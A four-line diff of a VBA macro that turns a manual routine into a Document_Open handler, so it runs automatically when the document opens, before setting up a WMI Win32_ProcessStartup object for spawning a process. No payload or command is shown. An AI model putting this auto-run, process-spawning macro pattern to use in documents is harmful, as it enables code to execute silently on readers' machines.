@@ -1,4 +1,4 @@
-Sub OpenDoc()
+Private Sub Document_Open()
 
 Set a = GetObject("winmgmts:Win32_ProcessStartup")
 Set config = a.SpawnInstance_
